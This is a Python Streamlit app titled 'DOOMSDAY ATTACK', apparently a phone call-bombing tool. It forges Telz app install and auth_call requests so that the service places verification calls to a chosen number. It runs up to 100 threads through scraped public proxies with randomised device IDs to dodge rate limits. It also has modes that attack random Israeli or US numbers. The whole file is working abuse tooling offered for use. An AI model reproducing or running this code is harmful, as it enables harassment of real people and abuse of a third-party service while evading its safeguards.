import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import webbrowser
import os
from concurrent.futures import ThreadPoolExecutor

# --- تثبيت المكتبات تلقائياً (كما في كودك الأصلي) ---
def install_libs():
    libs = ['requests', 'termcolor', 'pyfiglet']
    for lib in libs:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()

import requests
from termcolor import colored
import pyfiglet

# --- إعدادات واجهة Streamlit لتبدو مثل بايثون الأصلي ---
st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; font-weight: bold; }
    .doom-frame { border: 4px solid #ff0000; padding: 20px; border-radius: 15px; background-color: #0a0000; text-align: center; margin-bottom: 20px; }
    </style>
    """, unsafe_allow_html=True)

# --- نظام التحقق من المفتاح ---
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
    st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
    st.markdown("<h1 style='color: red;'>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
    user_key = st.text_input("ENTER ACCESS KEY:", type="password")
    if st.button("ACTIVATE 🔥"):
        if user_key == "aligx3gx3":
            st.session_state.authenticated = True
            st.rerun()
    st.stop()

# --- واجهة الهجوم ---
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
st.markdown("<h1 style='color: #ff0000;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
st.markdown("</div>", unsafe_allow_html=True)

# --- الدوال الأصلية بدون حذف أي حرف (COPY-PASTE) ---

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def fetch_internal_proxies():
    proxies = []
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"
    ]
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            if res.status_code == 200:
                for line in res.text.splitlines():
                    if ":" in line:
                        proxies.append(line.strip())
        except: pass
    return proxies

def is_proxy_working(proxy_dict):
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
        return response.status_code == 200
    except:
        return False

def load_proxies(filename="gx1gx1.txt"):
    all_proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
    internal = fetch_internal_proxies()
    all_proxies.extend(internal)
    return list(set(all_proxies))

def get_working_proxy(proxies_list):
    for _ in range(10):
        if not proxies_list: return None
        raw_proxy = random.choice(proxies_list)
        proxy_url = f"http://{raw_proxy}" if not raw_proxy.startswith(("http", "socks")) else raw_proxy
        proxy_dict = {"http": proxy_url, "https": proxy_url}
        if is_proxy_working(proxy_dict):
            return proxy_dict
    return None

def send_install_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return response.ok and "ok" in response.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return response.ok and "ok" in response.text
    except: return False

# --- المتغيرات والعدادات ---
if 'stats' not in st.session_state:
    st.session_state.stats = {"ok": 0, "error": 0}
if 'running' not in st.session_state:
    st.session_state.running = False

# --- واجهة التحكم ---
mode = st.radio("CHOOSE TARGET:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
if mode == "Manual Entry":
    c_code = st.text_input("Country Code (964):", "964")
    phone = st.text_input("Phone Number:")
else:
    c_code = "972" if "Israel" in mode else "1"
    phone = "RANDOM"

threads = st.slider("Threads:", 1, 100, 15)

# --- دالة العمل (نفس منطق بايثون تماماً) ---
def worker_task(country_code, number):
    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
    proxies_list = load_proxies("gx1gx1.txt")
    
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}

    while st.session_state.running:
        target_num = number if number != "RANDOM" else "".join(random.choices(string.digits, k=9))
        foxx, fox, foxer = generate_unique_ids()
        random_android_version = str(random.randint(7, 14))
        random_lang = random.choice(foreign_langs)
        proxy = get_working_proxy(proxies_list)

        payload_install = json.dumps({
            "android_id": fox, "app_version": "17.5.17", "event": "install",
            "google_exists": "yes", "os": "android", "os_version": random_android_version,
            "play_market": True, "ts": foxx, "uuid": str(foxer)
        })

        try:
            if send_install_request(install_url, headers, payload_install, proxy):
                payload_auth_call = json.dumps({
                    "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                    "event": "auth_call", "lang": random_lang, "os": "android",
                    "os_version": random_android_version, "phone": f"+{country_code}{target_num}",
                    "ts": foxx, "uuid": str(foxer)
                })
                if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
                    st.session_state.stats["ok"] += 1
                else: st.session_state.stats["error"] += 1
            else: st.session_state.stats["error"] += 1
        except: st.session_state.stats["error"] += 1

# --- التشغيل ---
if st.button("🔥 START ATTACK"):
    st.session_state.running = True
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(worker_task, c_code, phone)

if st.button("🛑 STOP"):
    st.session_state.running = False
    st.rerun()

# --- العدادات بالإنجليزية ---
st.markdown(f"### SUCCESS: {st.session_state.stats['ok']} | FAILED: {st.session_state.stats['error']}")
